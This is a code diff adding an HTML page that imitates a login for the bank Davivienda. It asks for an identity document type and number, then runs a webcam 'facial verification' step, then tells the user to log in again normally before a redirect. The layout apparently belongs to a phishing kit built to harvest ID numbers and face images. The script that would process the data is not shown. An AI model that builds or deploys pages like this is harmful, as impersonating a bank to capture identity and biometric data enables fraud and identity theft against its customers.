@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="main-container">
+        <header class="header">
+            <div class="logo-container">
+                <!-- Using a placeholder for the logo or text if image is not available -->
+                <h1 class="logo-text">Davivienda</h1>
+            </div>
+        </header>
+
+        <main class="content-wrapper" id="login-step">
+            <div class="login-card">
+                <h2 class="greeting">¡Hola!</h2>
+                
+                <form id="login-form">
+                    <div class="form-group">
+                        <label for="doc-type" class="sr-only">Tipo de documento</label>
+                        <div class="select-wrapper">
+                            <select id="doc-type" name="doc-type" required>
+                                <option value="" disabled selected>Seleccione su tipo de documento</option>
+                                <option value="CC">Cédula de ciudadanía</option>
+                                <option value="CE">Cédula de extranjería</option>
+                                <option value="TI">Tarjeta de identidad</option>
+                                <option value="RC">Registro civil de nacimiento</option>
+                                <option value="PA">Pasaporte</option>
+                                <option value="PPT">Permiso por Protección Temporal</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="doc-number" class="floating-label">Ingrese su número de documento</label>
+                        <input type="tel" id="doc-number" name="doc-number" required autocomplete="off">
+                    </div>
+
+                    <div class="form-check">
+                        <input type="checkbox" id="remember-me" name="remember-me">
+                        <label for="remember-me">Recordar mis datos de identidad</label>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Continuar</button>
+                </form>
+            </div>
+        </main>
+
+        <main class="content-wrapper hidden" id="verification-step">
+            <div class="verification-card">
+                <div class="verification-header">
+                    <h3>Verificación facial</h3>
+                    <p>Para continuar, necesitamos verificar tu identidad mediante un escaneo facial</p>
+                </div>
+
+                <div class="camera-container">
+                    <div class="camera-frame">
+                        <div class="camera-overlay">
+                            <span class="camera-instruction">Mantén tu rostro en el centro</span>
+                        </div>
+                        <video id="webcam" autoplay playsinline muted></video>
+                    </div>
+                </div>
+
+                <div class="instructions-list">
+                    <ul>
+                        <li>Asegúrese de tener buena iluminación</li>
+                        <li>Centre su rostro en el marco</li>
+                        <li>Retire gafas o accesorios</li>
+                        <li>Mantenga una expresión neutral</li>
+                    </ul>
+                </div>
+            </div>
+        </main>
+
+        <main class="content-wrapper hidden" id="success-step">
+            <div class="success-card">
+                <div class="success-icon">✓</div>
+                <h3>Verificación completada</h3>
+                <p>Ingrese de nuevo normalmente y será redirigido...</p>
+            </div>
+        </main>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
